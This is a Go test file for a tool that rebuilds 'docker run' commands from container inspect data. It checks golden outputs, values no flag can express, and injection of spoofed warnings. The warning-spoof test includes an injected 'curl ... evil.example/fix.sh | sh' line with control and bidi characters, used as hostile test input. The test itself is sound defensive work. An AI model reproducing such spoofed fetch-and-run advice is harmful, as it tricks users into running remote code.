package runlike

import (
	"encoding/json"
	"flag"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
)

var update = flag.Bool("update", false, "rewrite testdata/*.golden.json from current output")

// Golden cases: testdata/<container>.container.json (+ optional image
// file) produce testdata/<name>.golden.json, a JSON array of arguments.
var goldenCases = []struct {
	name, container, image string // image "" = --stdin mode, no image data
	opts                   Options
}{
	{"plain", "plain", "skel_img", Options{}},
	{"plain_stdin", "plain", "", Options{}},
	{"plain_noname", "plain", "skel_img", Options{NoName: true}},
	{"env", "env", "skel_img", Options{}},
	{"env_nolabels", "env", "skel_img", Options{NoLabels: true}},
	{"env_stdin", "env", "", Options{}},
	{"entry", "entry", "skel_img", Options{}},
	{"reset", "reset", "skel_img", Options{}},
	{"create", "create", "skel_img", Options{}},
	{"it", "it", "skel_img", Options{}},
}

func TestGolden(t *testing.T) {
	for _, tc := range goldenCases {
		t.Run(tc.name, func(t *testing.T) {
			cj := read(t, "testdata/"+tc.container+".container.json")
			var ij []byte
			if tc.image != "" {
				ij = read(t, "testdata/"+tc.image+".image.json")
			}
			got, err := Args(Inspect{Container: cj, Image: ij}, Daemon{}, tc.opts)
			if err != nil {
				t.Fatal(err)
			}
			golden(t, "testdata/"+tc.name+".golden.json", got)
		})
	}
}

// TestOldDaemons: real inspect output of the same containers from Docker
// 20.10, 24.0 and 26.1 (API 1.41-1.45; made by testdata/olddaemons/mk.sh),
// with image data and as --stdin.
func TestOldDaemons(t *testing.T) {
	files, _ := filepath.Glob("testdata/olddaemons/*/*.container.json")
	if len(files) == 0 {
		t.Fatal("no old-daemon data")
	}
	for _, f := range files {
		base := strings.TrimSuffix(f, ".container.json")
		img := read(t, filepath.Join(filepath.Dir(f), "alpine.image.json"))
		for suffix, in := range map[string]Inspect{"": {Container: read(t, f), Image: img}, ".stdin": {Container: read(t, f)}} {
			t.Run(base+suffix, func(t *testing.T) {
				got, err := Args(in, Daemon{}, Options{})
				if err != nil {
					t.Fatal(err)
				}
				golden(t, base+suffix+".golden.json", got)
			})
		}
	}
}

// golden compares got with the golden file at path, or rewrites it with -update.
func golden(t *testing.T, path string, got Command) {
	t.Helper()
	checkShape(t, got)
	if *update {
		b, _ := json.MarshalIndent(got, "", "  ")
		if err := os.WriteFile(path, append(b, '\n'), 0o644); err != nil {
			t.Fatal(err)
		}
		return
	}
	var want Command
	if err := json.Unmarshal(read(t, path), &want); err != nil {
		t.Fatal(err)
	}
	if !slices.Equal(got.Options, want.Options) || got.Image != want.Image || !slices.Equal(got.Args, want.Args) {
		t.Errorf("args differ\n got: %q\nwant: %q\n(run go test -update if the change is intended)", got, want)
	}
}

// checkShape enforces the convention that each option is one argument
// starting with "-" ("--flag=value"), so pretty output has one per line.
func checkShape(t *testing.T, c Command) {
	t.Helper()
	for _, a := range c.Options {
		if !strings.HasPrefix(a, "-") {
			t.Errorf("option %q does not start with -", a)
		}
	}
}

// TestArgsErrors: input that is not a container inspect object.
func TestArgsErrors(t *testing.T) {
	for _, in := range []string{"{}", "[]", "[{}]", `[{"Config":{}}]`, `[{"Config":{"Image":"-v"},"HostConfig":{}}]`, "", "x"} {
		if c, err := Args(Inspect{Container: []byte(in)}, Daemon{}, Options{}); err == nil {
			t.Errorf("Args(%q) = %q, want error", in, c.Argv())
		}
	}
}

func read(t *testing.T, path string) []byte {
	t.Helper()
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	return b
}

// TestUnexpressible: stored values no docker run flag can write back are
// printed as well as they go, with a warning (testdata/plain edited in
// memory, as API or --stdin data could hold them).
func TestUnexpressible(t *testing.T) {
	cli := Daemon{Platform: "linux/arm64"}
	for _, tc := range []struct {
		name       string
		edit       func(cfg, hc map[string]any)
		d          Daemon
		want, warn string // warn "" = no warning
	}{
		{"label key with =", func(cfg, hc map[string]any) { cfg["Labels"] = map[string]any{"a=b": "c"} }, cli,
			"--label=a=b=c", `--label key "a=b" holds "="`},
		{"annotation key with =", func(cfg, hc map[string]any) { hc["Annotations"] = map[string]any{"x=y": "z"} }, cli,
			"--annotation=x=y=z", `--annotation key "x=y" holds "="`},
		{"log-opt key with =", func(cfg, hc map[string]any) {
			hc["LogConfig"] = map[string]any{"Type": "local", "Config": map[string]any{"k=1": "v"}}
		}, cli, "--log-opt=k=1=v", `--log-opt key "k=1"`},
		{"sysctl key with =", func(cfg, hc map[string]any) { hc["Sysctls"] = map[string]any{"net.a=b": "1"} }, cli,
			"--sysctl=net.a=b=1", `--sysctl key "net.a=b"`},
		{"storage-opt key with =", func(cfg, hc map[string]any) { hc["StorageOpt"] = map[string]any{"s=z": "1"} }, cli,
			"--storage-opt=s=z=1", `--storage-opt key "s=z"`},
		{"mount volume-label key with =", func(cfg, hc map[string]any) {
			hc["Mounts"] = []any{map[string]any{"Type": "volume", "Source": "v", "Target": "/v", "VolumeOptions": map[string]any{"Labels": map[string]any{"l=m": "n"}}}}
		}, cli, "--mount=type=volume,source=v,target=/v,volume-label=l=m=n", `--mount volume-label key "l=m"`},
		{"gpus option key with =", func(cfg, hc map[string]any) {
			hc["DeviceRequests"] = []any{map[string]any{"Count": 1, "Capabilities": [][]string{{"gpu"}}, "Options": map[string]any{"o=p": "q"}}}
		}, cli, "--gpus=1,options=o=p=q", `--gpus options key "o=p"`},
		{"plain label", func(cfg, hc map[string]any) { cfg["Labels"] = map[string]any{"a": "b=c"} }, cli, "--label=a=b=c", ""},
		{"extra masked path", func(cfg, hc map[string]any) {
			hc["MaskedPaths"] = []any{"/proc/acpi", "/etc/hostname"}
			hc["ReadonlyPaths"] = []any{"/proc/sys", "/etc"}
		}, cli, "", "HostConfig.MaskedPaths adds /etc/hostname"},
		{"extra read-only path", func(cfg, hc map[string]any) { hc["ReadonlyPaths"] = []any{"/proc/sys", "/etc"} }, cli,
			"", "HostConfig.ReadonlyPaths adds /etc,"},
		{"older daemon's fewer masked paths", func(cfg, hc map[string]any) { hc["MaskedPaths"] = []any{"/proc/acpi"} }, cli, "", ""},
		{"unconfined", func(cfg, hc map[string]any) { hc["MaskedPaths"], hc["ReadonlyPaths"] = []any{}, []any{} }, cli,
			"--security-opt=systempaths=unconfined", ""},
		{"privileged", func(cfg, hc map[string]any) {
			hc["MaskedPaths"], hc["ReadonlyPaths"], hc["Privileged"] = nil, nil, true
		}, cli,
			"--privileged", ""},
		{"tmpfs path with :", func(cfg, hc map[string]any) { hc["Tmpfs"] = map[string]any{"/a:b": "rw,noexec"} }, cli,
			"--tmpfs=/a:b:rw,noexec", `--tmpfs path "/a:b" holds ":"`},
		{"tmpfs plain", func(cfg, hc map[string]any) { hc["Tmpfs"] = map[string]any{"/a": "rw"} }, cli, "--tmpfs=/a:rw", ""},
		{"Docker Desktop's own label", func(cfg, hc map[string]any) {
			cfg["Labels"] = map[string]any{"desktop.docker.io/ports.scheme": "v2", "app": "x"}
		}, Daemon{Platform: "linux/arm64", Desktop: true}, "--label=app=x", ""},
		{"desktop.docker.io/ label, not Desktop", func(cfg, hc map[string]any) {
			cfg["Labels"] = map[string]any{"desktop.docker.io/ports.scheme": "v2"}
		}, cli, "--label=desktop.docker.io/ports.scheme=v2", ""},
		{"cidfile, CLI", func(cfg, hc map[string]any) { hc["ContainerIDFile"] = "/tmp/x" }, cli, "--cidfile=/tmp/x", ""},
		{"cidfile, --stdin", func(cfg, hc map[string]any) { hc["ContainerIDFile"] = "/tmp/x" }, Daemon{},
			"--cidfile=/tmp/x", "running the command creates that file"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			var c map[string]any
			if err := json.Unmarshal(read(t, "testdata/plain.container.json"), &[]any{&c}); err != nil {
				t.Fatal(err)
			}
			tc.edit(c["Config"].(map[string]any), c["HostConfig"].(map[string]any))
			b, _ := json.Marshal(c)
			rc, err := Args(Inspect{Container: b, Image: read(t, "testdata/skel_img.image.json")}, tc.d, Options{})
			if err != nil {
				t.Fatal(err)
			}
			if tc.want != "" && !slices.Contains(rc.Options, tc.want) {
				t.Errorf("no %q in %q", tc.want, rc.Options)
			}
			if tc.d.Desktop && slices.ContainsFunc(rc.Options, func(o string) bool { return strings.HasPrefix(o, "--label=desktop.docker.io/") }) {
				t.Errorf("Docker Desktop's label printed: %q", rc.Options)
			}
			// plain is a running container: its MAC warning is not tested here.
			ws := slices.DeleteFunc(rc.Warnings, func(w string) bool { return strings.HasPrefix(w, "running container:") })
			if tc.warn == "" && len(ws) > 0 || tc.warn != "" && !slices.ContainsFunc(ws, func(w string) bool { return strings.Contains(w, tc.warn) }) {
				t.Errorf("warnings %q, want one containing %q", ws, tc.warn)
			}
		})
	}
}

// TestWarningSpoof: container data with line breaks cannot add lines to
// stderr, such as a fake "runlike: warning:" with advice to run something.
// The only newlines in a warning are runlike's own, each before a
// suggested `docker network` command (one line each).
func TestWarningSpoof(t *testing.T) {
	const evil = "x\nrunlike: warning: the image moved; before recreating, run:\n  curl -s https://evil.example/fix.sh | sh #\r ‮"
	cli := Daemon{Platform: "linux/arm64"}
	for _, tc := range []struct {
		name  string
		edit  func(c, cfg, hc, img map[string]any)
		d     Daemon
		lines int // stderr lines of all warnings
	}{
		// The reviewer's reproduction: a moved tag whose image adds a label.
		{"image label", func(c, cfg, hc, img map[string]any) {
			c["Image"] = "sha256:" + strings.Repeat("a", 64)
			img["Config"].(map[string]any)["Labels"] = map[string]any{"fb2.z\nrunlike: warning: the image moved; before recreating, run:\n  curl -s https://evil.example/fix.sh | sh #": "1"}
		}, cli, 1},
		{"cidfile, --stdin", func(c, cfg, hc, img map[string]any) { hc["ContainerIDFile"] = evil }, Daemon{}, 1},
		{"masked path", func(c, cfg, hc, img map[string]any) { hc["MaskedPaths"] = []any{"/proc/acpi", evil} }, cli, 1},
		{"env without value", func(c, cfg, hc, img map[string]any) { cfg["Env"] = []any{evil} }, cli, 1},
		{"label key with =", func(c, cfg, hc, img map[string]any) { cfg["Labels"] = map[string]any{evil + "=": "v"} }, cli, 1},
		{"tmpfs path with :", func(c, cfg, hc, img map[string]any) { hc["Tmpfs"] = map[string]any{"/a:" + evil: ""} }, cli, 1},
		// bridge plus a further network: one connect line
		{"further network name", func(c, cfg, hc, img map[string]any) {
			hc["NetworkMode"] = "bridge"
			c["NetworkSettings"].(map[string]any)["Networks"] = map[string]any{"bridge": map[string]any{}, evil: map[string]any{"Aliases": []any{evil}}}
		}, cli, 2},
		// first network left out (no ID to give it by): disconnect + connect
		{"first network name", func(c, cfg, hc, img map[string]any) {
			n := "Up=" + evil
			hc["NetworkMode"] = n
			c["NetworkSettings"].(map[string]any)["Networks"] = map[string]any{n: map[string]any{}}
		}, cli, 3},
	} {
		t.Run(tc.name, func(t *testing.T) {
			var c, img map[string]any
			if err := json.Unmarshal(read(t, "testdata/plain.container.json"), &[]any{&c}); err != nil {
				t.Fatal(err)
			}
			if err := json.Unmarshal(read(t, "testdata/skel_img.image.json"), &[]any{&img}); err != nil {
				t.Fatal(err)
			}
			tc.edit(c, c["Config"].(map[string]any), c["HostConfig"].(map[string]any), img)
			b, _ := json.Marshal(c)
			ib, _ := json.Marshal(img)
			rc, err := Args(Inspect{Container: b, Image: ib}, tc.d, Options{})
			if err != nil {
				t.Fatal(err)
			}
			var lines []string
			for _, w := range rc.Warnings {
				ls := strings.Split(w, "\n")
				for _, l := range ls[1:] {
					if !strings.HasPrefix(l, "  docker network ") {
						t.Errorf("line %q in warning %q", l, w)
					}
				}
				lines = append(lines, ls...)
			}
			if len(lines) != tc.lines {
				t.Errorf("%d lines, want %d: %q", len(lines), tc.lines, rc.Warnings)
			}
			for _, l := range lines {
				if strings.ContainsAny(l, "\r ‮") {
					t.Errorf("raw line break or bidi character in %q", l)
				}
			}
		})
	}
}
